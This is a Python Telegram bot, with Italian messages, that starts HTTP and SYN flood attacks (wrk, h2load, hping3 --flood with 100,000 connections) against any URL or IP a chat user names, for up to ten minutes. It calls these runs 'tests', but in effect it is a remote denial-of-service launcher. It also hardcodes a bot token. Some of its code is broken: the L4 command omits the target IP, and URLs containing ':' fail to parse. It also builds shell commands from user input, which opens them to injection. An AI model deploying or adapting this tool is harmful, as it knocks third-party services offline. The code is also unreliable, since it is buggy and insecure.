#!/usr/bin/env python3

import subprocess
import os
import signal
import ipaddress
import threading
import time
from urllib.parse import urlparse
from telegram.ext import Updater, CommandHandler
import shutil

# ================= CONFIG =================
TOKEN = "8593144725:AAHw5UoWAnrANQCZIw1mwsbNkh8c_roFmLU"
AUTHORIZED_ID = 5699538596
MAX_TIME = 600
# =========================================

process = None
LAST_DESC = None
is_running_flag = False
progress_thread = None
progress_stop_event = threading.Event()
progress_message = None

# ================= PRESET =================
L7_PRESETS = {
    "basic": {"bin": "wrk", "flags": "-t30 -c100000 -d10m"},
    "aggressive": {"bin": "h2load", "flags": "-n 10000 -c 100000 -t 30"}
}

L4_PRESETS = {
    "default": {"cmd": "hping3", "args": "-S -p {port} -d 9999 --flood"},
    "fast": {"cmd": "tx_program", "args": "-p {port} -d 30 -t 600"}
}

# ================= UTILS =================
def is_authorized(update):
    return update.effective_user.id == AUTHORIZED_ID

def kill_process():
    global process, is_running_flag
    if process and process.poll() is None:
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
    process = None
    is_running_flag = False

# ================= PROGRESS BAR =================
def progress_bar_loop(context, chat_id, duration):
    global progress_message, is_running_flag
    start_time = time.time()
    while not progress_stop_event.is_set():
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        if remaining <= 0:
            kill_process()
            break

        percent = int((elapsed / duration) * 100)
        blocks = int(percent / 5)  # 20 blocchi
        bar = "█" * blocks + "░" * (20 - blocks)

        text = f"{LAST_DESC}\n[{bar}] {percent}% ⏱ {remaining}s rimanenti"

        try:
            progress_message.edit_text(text)
        except:
            pass

        time.sleep(1)
    is_running_flag = False

# ================= COMMANDS =================
def start(update, context):
    if not is_authorized(update):
        return
    update.message.reply_text(
        "🤖 Bot pronto.\n\n"
        "L7:\n"
        "  /l7 url:method:tempo  (method: basic|aggressive, max 600s)\n"
        "L4:\n"
        "  /l4 ip:port:method:tempo  (method: default|fast, max 600s)\n\n"
        "/status – stato\n"
        "/stop – ferma test"
    )

# ---------- L7 ----------
def l7_command(update, context):
    global process, LAST_DESC, progress_thread, progress_stop_event, progress_message, is_running_flag
    if not is_authorized(update):
        return
    if is_running_flag:
        update.message.reply_text("⚠️ Un test è già in esecuzione")
        return
    if not context.args:
        update.message.reply_text("Uso: /l7 url:method:tempo")
        return

    try:
        url, method, tempo = context.args[0].split(":")
    except ValueError:
        update.message.reply_text("Formato non valido")
        return

    preset = L7_PRESETS.get(method.strip().lower())
    if not preset:
        update.message.reply_text("Preset L7 non valido")
        return

    if not shutil.which(preset['bin']):
        update.message.reply_text(f"Comando {preset['bin']} non trovato sul sistema!")
        return

    try:
        tempo = int(tempo)
    except ValueError:
        update.message.reply_text("Tempo non valido")
        return
    if not (1 <= tempo <= MAX_TIME):
        update.message.reply_text(f"Tempo fuori range 1-{MAX_TIME}s")
        return

    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        update.message.reply_text("URL non valido")
        return

    cmd_str = f"{preset['bin']} {preset['flags']} {url}"
    print(f"Eseguo comando L7: {cmd_str}")  # debug

    try:
        process = subprocess.Popen(cmd_str, shell=True, preexec_fn=os.setsid)
    except Exception as e:
        update.message.reply_text(f"Errore nell'avvio del comando: {e}")
        return

    LAST_DESC = f"L7 {method} → {url} : {tempo}s"
    is_running_flag = True

    progress_stop_event.clear()
    progress_message = update.message.reply_text(f"⏳ Avvio test L7 ({tempo}s)...")
    progress_thread = threading.Thread(target=progress_bar_loop, args=(context, update.effective_chat.id, tempo), daemon=True)
    progress_thread.start()

# ---------- L4 ----------
def l4_command(update, context):
    global process, LAST_DESC, progress_thread, progress_stop_event, progress_message, is_running_flag
    if not is_authorized(update):
        return
    if is_running_flag:
        update.message.reply_text("⚠️ Un test è già in esecuzione")
        return
    if not context.args:
        update.message.reply_text("Uso: /l4 ip:port:method:tempo")
        return

    try:
        ip, port, method, tempo = context.args[0].split(":")
    except ValueError:
        update.message.reply_text("Formato non valido")
        return

    preset = L4_PRESETS.get(method.strip().lower())
    if not preset:
        update.message.reply_text("Preset L4 non valido")
        return

    if not shutil.which(preset['cmd']):
        update.message.reply_text(f"Comando {preset['cmd']} non trovato sul sistema!")
        return

    try:
        ipaddress.ip_address(ip)
    except ValueError:
        update.message.reply_text("IP non valido")
        return
    if not port.isdigit() or not (1 <= int(port) <= 65535):
        update.message.reply_text("Porta non valida")
        return
    try:
        tempo = int(tempo)
    except ValueError:
        update.message.reply_text("Tempo non valido")
        return
    if not (1 <= tempo <= MAX_TIME):
        update.message.reply_text(f"Tempo fuori range 1-{MAX_TIME}s")
        return

    cmd_str = f"{preset['cmd']} {preset['args'].format(port=port)}"
    print(f"Eseguo comando L4: {cmd_str}")  # debug

    try:
        process = subprocess.Popen(cmd_str, shell=True, preexec_fn=os.setsid)
    except Exception as e:
        update.message.reply_text(f"Errore nell'avvio del comando: {e}")
        return

    LAST_DESC = f"L4 {method} → {ip}:{port} : {tempo}s"
    is_running_flag = True

    progress_stop_event.clear()
    progress_message = update.message.reply_text(f"⏳ Avvio test L4 ({tempo}s)...")
    progress_thread = threading.Thread(target=progress_bar_loop, args=(context, update.effective_chat.id, tempo), daemon=True)
    progress_thread.start()

# ---------- STOP ----------
def stop_command(update, context):
    if not is_authorized(update):
        return
    if is_running_flag:
        progress_stop_event.set()
        kill_process()
        update.message.reply_text("⛔ Test fermato manualmente")
    else:
        update.message.reply_text("ℹ️ Nessun test attivo")

# ---------- STATUS ----------
def status_command(update, context):
    if not is_authorized(update):
        return
    if is_running_flag:
        update.message.reply_text(f"🟢 Test attivo\n{LAST_DESC}")
    else:
        update.message.reply_text("🔴 Nessun test attivo")

# ================= MAIN =================
def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("l7", l7_command))
    dp.add_handler(CommandHandler("l4", l4_command))
    dp.add_handler(CommandHandler("stop", stop_command))
    dp.add_handler(CommandHandler("status", status_command))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
